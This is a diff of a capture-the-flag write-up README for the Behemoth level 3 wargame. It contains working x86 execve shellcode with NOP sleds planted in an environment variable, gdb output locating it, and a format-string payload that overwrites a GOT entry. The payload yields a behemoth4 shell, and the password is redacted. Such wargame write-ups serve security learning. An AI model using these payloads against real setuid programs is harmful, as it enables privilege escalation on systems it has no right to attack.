@@ -479,18 +479,64 @@ We can use puts address as it's executed after printf. We can also use the funct
 behemoth3@behemoth:/behemoth$ nm behemoth3 | grep 'DTOR'
 ```
 Unfortunately we don't have anything, but sometimes it can be useful.
-Okay, to the dirty job -> we are going to write byte after byte into our address, which is 0x080497ac. You can see that I have adjusted it many times. I put the log in the root directory, as it contains many addresses. Link:
+Okay, to the dirty job -> we are going to write byte after byte into our address, which is 0x080497ac. Let's plant our shellcode as environ:
+```
+ export EGG=$(python -c "print('\x90'*500+'\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43'+\x90'*500)")
+```
+This is the second shellcode I used, because the first one didn't work. You can find many in shellstorm. Anyway, the shellcode is padded with 500NOPS at the start and end of it.
+
+Let's fire up gdb and get our shellcode's address (start and break in main). We first remove unnecessary environs from it, so we will have almost the identical stuck (so we won't have alignment issues):
+```
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) x/50s *((char **) environ)
+0xffffd4a0:	"LC_ALL=en_US.UTF-8"
+0xffffd4b3:	"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...
+0xffffd57b:	"=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=0"...
+0xffffd643:	"1;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.al"...
+0xffffd70b:	"z=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;"...
+0xffffd7d3:	"35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*"...
+0xffffd89b:	".mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35"...
+0xffffd963:	":*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=0"...
+0xffffda2b:	"0;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:"
+0xffffda6f:	"SSH_CONNECTION=132.68.40.23 50726 192.168.101.70 22"
+0xffffdaa3:	"EGG=", '\220' <repeats 196 times>...
+0xffffdb6b:	'\220' <repeats 200 times>...
+0xffffdc33:	'\220' <repeats 104 times>, "\353\v[1\300\061\311\061Ұ\v̀\350\360\377\377\377/bin/sh", '\220' <repeats 71 times>...
+0xffffdcfb:	'\220' <repeats 200 times>...
+0xffffddc3:	'\220' <repeats 200 times>...
+0xffffde8b:	'\220' <repeats 29 times>
+0xffffdea9:	"_=/usr/bin/gdb"
+0xffffdeb8:	"LANG=en_US.UTF-8"
+0xffffdec9:	"OLDPWD=/tmp/intersys"
+0xffffdede:	"USER=behemoth3"
+0xffffdeed:	"PWD=/behemoth"
+0xffffdefb:	"HOME=/home/behemoth3"
+0xffffdf10:	"SSH_CLIENT=132.68.40.23 50726 22"
+0xffffdf31:	"SSH_TTY=/dev/pts/2"
+0xffffdf44:	"MAIL=/var/mail/behemoth3"
+0xffffdf5d:	"SHELL=/bin/bash"
+0xffffdf6d:	"TERM=xterm-256color"
+0xffffdf81:	"TMOUT=1800"
+0xffffdf8c:	"SHLVL=1"
+0xffffdf94:	"LOGNAME=behemoth3"
+0xffffdfa6:	"PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
+```
+We see the our address is at 0xffffdaa3. Let's overwrite that value in our put's address (0x080497ac). 
+This process took me sometime, first to overwrite the address (playing with the width of the %x format string) and then jumping to the shellcode. I attached the log here:
 [Link](https://github.com/int3rsys/behemoth-solutions/blob/master/behemoth3.log)
 **I highly advise you to read the links above in order to successfully write the data in your machine**
 
 So the the input was:
 ```
-python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%140x%n%235x%n%109x%n%260x%n')"
-```
-
-Now let's plant our shellcode:
-```
-
+behemoth3@behemoth:/behemoth$ (python -c "print('AAAA\xac\x97\x04\x08AAAA\xad\x97\x04\x08AAAA\xae\x97\x04\x08AAAA\xaf\x97\x04\x08%137x%n%49x%n%37x%n%256x%n')";cat) | ./behemoth3
+Identify yourself: Welcome, AAAA��AAAA��AAAA��AAAA��                                                                                                                                 41414141                                         41414141                             41414141                                                                                                                                                                                                                                                        41414141
+whoami
+behemoth4
+cat /etc/behemoth_pass/behemoth3
+cat: /etc/behemoth_pass/behemoth3: Permission denied
+cat /etc/behemoth_pass/behemoth4
+********
 ```
 
 You can use the [editor on GitHub](https://github.com/int3rsys/behemoth-solutions/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
